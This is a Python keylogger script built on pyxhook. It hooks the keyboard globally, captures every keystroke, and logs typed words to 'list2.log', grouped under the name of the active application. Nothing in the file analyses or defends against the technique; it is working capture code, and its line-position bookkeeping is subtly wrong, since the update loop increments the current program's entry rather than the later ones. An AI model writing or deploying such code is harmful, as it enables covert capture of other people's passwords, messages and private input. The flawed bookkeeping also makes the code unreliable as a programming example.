import os

import pyxhook

from collections import OrderedDict

open('list2.log','w').close()

old_app = ''
#temproray word list. file would be costlier
word_list = ''

#dictionary of program at which they are started alongwith value as line number
dict_of_programs = OrderedDict()

def onKeyPress(event):
	global old_app
	global word_list

	new_app = event.WindowProcName

	if new_app != old_app and new_app !='':
		extract_words()
		old_app = new_app
	else:
		pass
##############this part to be changed
	if event.Key == 'space' or event.Key == 'Return':
		extract_word(new_app)
################This part also
	else:
		word_list += event.Key

	#if event.Ascii == 96: #hit the grave key to end running this program
	#	new_hook.cancel()

#instantiating the hook class
new_hook = pyxhook.HookManager()

#listening to the key strokes
new_hook.KeyDown = onKeyPress

#hooking the keyboard
new_hook.HookKeyboard()

#start the session
try:
	new_hook.start()
except KeyboardInterrupt:
	#User cancelled from command line
	pass
except Exception as ex:
	#Write exception in terminal itself
	msg = 'Error while catching events:\n {}'.format(ex)
	pyxhook.print_err(msg)
	# One can also write error in log file here. But i don't need it.

########

def extract_words():
	global word_list
	global old_app
	global dict_of_programs

	# application name appearing for the first time
	if old_app not in dict_of_programs:
		with open('list2.log','a') as f1:
			f1.write( old_app + "\n" + word_list + "\n" )

		# I need to read no. of lines so as to store and append
		with open('list2.log','r') as f2:
			data = f2.readlines()

		pos = len(data)

		dict_of_programs[old_app] = pos
		# at the length you append the new word.
		#Simply fetch and add and also

	else:
		#retrieve position at which one gonna add 
		position = dict_of_programs[old_app]

		#open file, read,it, copy it back with modification
		with open('list2.log','r') as f1:
			data = f1.readlines()

		data.insert(position, word_list + '\n')

		# No need to do \n here. It's already done:)
		with open('list2.log','w') as f2:
			for item in data:
				f2.write('%s'% item)
		
		# update the program list, inc list by 1
		# works for python3< 3.6 
		# stack overflow 36090175
		index_of = tuple(dict_of_programs.keys()).index(old_app)

		for index, (key,value) in enumerate(dict_of_programs.items()):
			if index < index_of:
				pass
			else:
				dict_of_programs[old_app] = dict_of_programs[old_app] + 1


	word_list = ''


'''
		# Write and see length of data
		length = len(data)

		data.insert(length,old_proc + '\n')

		with open('list2.log','w') as fo:
			for item in data:
				fo.write('%s'% item)

	#with automatically closes the file
	with open('list2.log','r') as f:
		data = f.readlines()

	for i in range(len(data)):
		if data[i] == old_proc
			
			break
	else:
'''


def extract_word(appName):
	global word_list
	global dict_of_programs
	if appName not in dict_of_programs:
		# if application name not in dict, it will be written at last
		with open('list2.log','a') as f1:
			f1.write( appName + "\n" + word_list + "\n" )

		# I need to read no. of lines so as to store and append
		with open('list2.log','r') as f2:
			data = f2.readlines()

		pos = len(data)

		dict_of_programs[appName] = pos
		# at the length you append the new word.
		#Simply fetch and add and also

	else:
		#retrieve position at which one gonna add 
		position = dict_of_programs[appName]

		#open file, read,it, copy it back with modification
		with open('list2.log','r') as f1:
			data = f1.readlines()

		data.insert(position, word_list + '\n')

		# No need to do \n here. It's already done:)
		with open('list2.log','w') as f2:
			for item in data:
				f2.write('%s'% item)
		
		# update the program list, inc list by 1
		# works for python3< 3.6 
		# stack overflow 36090175
		index_of = tuple(dict_of_programs.keys()).index(appName)

		for index, (key,value) in enumerate(dict_of_programs.items()):
			if index < index_of:
				pass
			else:
				dict_of_programs[appName] = dict_of_programs[appName] + 1

	word_list = ''

# This is where things are done

